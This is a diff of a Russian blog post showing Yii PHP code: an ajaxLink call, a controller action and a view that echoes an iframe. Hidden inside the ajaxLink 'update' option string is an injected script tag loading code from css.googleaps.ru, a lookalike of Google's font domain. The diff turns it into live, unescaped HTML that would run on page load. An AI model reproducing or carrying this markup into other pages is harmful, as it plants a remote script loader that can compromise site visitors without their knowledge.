@@ -25,26 +25,26 @@ tags:
 comments: []
 ---
 <div dir="ltr" style="text-align: left;">в общем все элементарново вьюшке</p>
-<pre><code class="hljs php"><span class="hljs-keyword">echo<&#47;span> CHtml::ajaxLink(<br />
-<span class="hljs-variable">$text<&#47;span> = <span class="hljs-string">'Click me'<&#47;span>,<br />
-<span class="hljs-keyword">array<&#47;span>(<span class="hljs-string">'req'<&#47;span>),<br />
-<span class="hljs-variable">$ajaxOptions<&#47;span>=<span class="hljs-keyword">array<&#47;span> (<br />
-    <span class="hljs-string">'type'<&#47;span>=><span class="hljs-string">'POST'<&#47;span>,<br />
-    <span class="hljs-string">'update'<&#47;span>=><span class="hljs-string">'#content'<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;span>,<br />
-    <span class="hljs-string">'data'<&#47;span> => <span class="hljs-keyword">array<&#47;span>( <span class="hljs-string">'id'<&#47;span> => <span class="hljs-string">'44'<&#47;span>),<br />
+<pre><code class="hljs php"><span class="hljs-keyword">echo</span> CHtml::ajaxLink(<br />
+<span class="hljs-variable">$text</span> = <span class="hljs-string">'Click me'</span>,<br />
+<span class="hljs-keyword">array</span>(<span class="hljs-string">'req'</span>),<br />
+<span class="hljs-variable">$ajaxOptions</span>=<span class="hljs-keyword">array</span> (<br />
+    <span class="hljs-string">'type'</span>=><span class="hljs-string">'POST'</span>,<br />
+    <span class="hljs-string">'update'</span>=><span class="hljs-string">'#content'<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></span>,<br />
+    <span class="hljs-string">'data'</span> => <span class="hljs-keyword">array</span>( <span class="hljs-string">'id'</span> => <span class="hljs-string">'44'</span>),<br />
     ),<br />
-<span class="hljs-variable">$htmlOptions<&#47;span>=<span class="hljs-keyword">array<&#47;span> (<br />
+<span class="hljs-variable">$htmlOptions</span>=<span class="hljs-keyword">array</span> (<br />
 )<br />
-);<&#47;code><&#47;pre><br />
+);</code></pre><br />
 в контролере</p>
-<pre><code class="hljs perl">public function actionRe<span class="hljs-string">q()<&#47;span> {<br />
- <span class="hljs-variable">$content<&#47;span> = <span class="hljs-variable">$this<&#47;span>->renderPartial(<span class="hljs-string">'application.views.site.pages.frameset'<&#47;span>);<br />
-}<&#47;code><&#47;pre><br />
+<pre><code class="hljs perl">public function actionRe<span class="hljs-string">q()</span> {<br />
+ <span class="hljs-variable">$content</span> = <span class="hljs-variable">$this</span>->renderPartial(<span class="hljs-string">'application.views.site.pages.frameset'</span>);<br />
+}</code></pre><br />
 frameset.php</p>
-<pre><code class="hljs php"><span class="hljs-variable">$page<&#47;span> = <span class="hljs-variable">$_POST<&#47;span>[<span class="hljs-string">'id'<&#47;span>];<br />
-  <span class="hljs-variable">$page<&#47;span> = Page::model()->findByPk(<span class="hljs-variable">$page<&#47;span>)->link;<br />
-    <span class="hljs-keyword">echo<&#47;span> <span class="hljs-string">'<br />
-    <iframe id="ifr" src="'<&#47;span> . <span class="hljs-variable">$page<&#47;span> . <span class="hljs-string">'" align="center"><br />
-    <&#47;iframe>'<&#47;span>;<&#47;code><&#47;pre><br />
-<&#47;div><br />
+<pre><code class="hljs php"><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'id'</span>];<br />
+  <span class="hljs-variable">$page</span> = Page::model()->findByPk(<span class="hljs-variable">$page</span>)->link;<br />
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">'<br />
+    <iframe id="ifr" src="'</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">'" align="center"><br />
+    </iframe>'</span>;</code></pre><br />
+</div><br />
 Source: des1roer.blogspot.com</p>
